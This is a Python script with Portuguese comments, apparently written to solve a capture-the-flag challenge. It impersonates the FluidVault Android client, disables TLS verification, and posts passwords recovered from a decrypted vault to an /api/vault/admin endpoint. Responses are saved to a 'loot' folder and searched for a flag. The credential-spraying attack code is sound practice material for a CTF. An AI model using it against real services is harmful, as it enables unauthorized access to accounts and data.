#!/usr/bin/env python3
import json
import os
import re
from pathlib import Path

import requests
import urllib3

# Desativa warning de certificado em ambiente CTF.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Host da instância do desafio.
TARGET = os.environ.get("TARGET", "b36266e754204c82.chal.ctf.ae").strip().rstrip("/")

LOOT_DIR = Path("loot")
LOOT_DIR.mkdir(exist_ok=True)

# Senhas recuperadas do vault descriptografado.
# A primeira é a candidata principal porque veio do item "Admin Portal".
PASSWORD_CANDIDATES = [
    "Fl00d_G4t3s_0p3n!",
    "Ema1l_2026!Secure",
    "Aws!D3pl0y#Pr0d",
]

# Testa HTTPS primeiro porque os desafios anteriores desse domínio normalmente usam TLS.
# Depois testa HTTP caso a instância esteja sem TLS.
BASE_URLS = [
    f"https://{TARGET}",
    f"http://{TARGET}",
]


def save_response(label: str, response: requests.Response) -> None:
    """
    Salva cada resposta bruta em loot para facilitar revisão e writeup.
    """
    safe_label = re.sub(r"[^a-zA-Z0-9_.-]+", "_", label)
    path = LOOT_DIR / f"script2_{safe_label}.txt"

    content = []
    content.append(f"URL: {response.url}")
    content.append(f"STATUS: {response.status_code}")
    content.append("HEADERS:")
    content.append(str(dict(response.headers)))
    content.append("")
    content.append("BODY:")
    content.append(response.text)

    path.write_text("\n".join(content), encoding="utf-8", errors="replace")
    print("[*] Salvo em:", path)


def show_response(label: str, response: requests.Response) -> bool:
    """
    Mostra status, corpo e procura flag.
    Retorna True se encontrar flag.
    """
    print()
    print("=" * 90)
    print(label)
    print("=" * 90)
    print("[*] URL:", response.url)
    print("[*] Status:", response.status_code)
    print("[*] Content-Type:", response.headers.get("Content-Type", ""))
    print("[*] Corpo:")
    print(response.text[:3000])

    save_response(label, response)

    flags = re.findall(r"flag\{[^}\r\n]+\}", response.text, re.IGNORECASE)

    if flags:
        print()
        print("=" * 90)
        print("[+] FLAG ENCONTRADA")
        print("=" * 90)

        for flag in flags:
            print(flag)

        Path("flag.txt").write_text(flags[0] + "\n", encoding="utf-8")
        print("[+] Primeira flag salva em flag.txt")
        return True

    return False


def try_base(base_url: str) -> bool:
    """
    Testa os endpoints encontrados no VaultApiClient.java.
    """
    session = requests.Session()
    session.headers.update({
        "Accept": "application/json",
        "User-Agent": "FluidVault/2.3.1 Android",
    })

    print()
    print("#" * 90)
    print("[*] Testando base:", base_url)
    print("#" * 90)

    # Primeiro consulta /api/vault/info porque o helper citava esse endpoint.
    try:
        response = session.get(
            f"{base_url}/api/vault/info",
            timeout=15,
            verify=False,
        )
        if show_response("GET_api_vault_info", response):
            return True
    except Exception as exc:
        print("[-] Falha no GET /api/vault/info:", repr(exc))

    # Depois envia a senha no formato exato do app:
    # {"master_password": "..."}
    for password in PASSWORD_CANDIDATES:
        print()
        print("[*] Testando master_password:", password)

        try:
            response = session.post(
                f"{base_url}/api/vault/admin",
                headers={"Content-Type": "application/json"},
                json={"master_password": password},
                timeout=15,
                verify=False,
            )

            if show_response(f"POST_api_vault_admin_{password}", response):
                return True

            # Se a resposta for JSON com token ou rota, mostra campos importantes.
            try:
                data = response.json()
                print("[*] JSON parseado:")
                print(json.dumps(data, indent=2, ensure_ascii=False))
            except Exception:
                pass

        except Exception as exc:
            print("[-] Falha no POST /api/vault/admin:", repr(exc))

    return False


def main() -> int:
    print("[*] Target:", TARGET)

    for base_url in BASE_URLS:
        if try_base(base_url):
            return 0

    print()
    print("=" * 90)
    print("[-] Flag não encontrada nessa rodada")
    print("=" * 90)
    print("[*] Próximo passo: revisar respostas em loot/script2_*.txt e testar rotas derivadas.")
    print("[*] Comando útil depois: grep -RniE 'flag|admin|token|secret|vault|error|password|master' loot")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
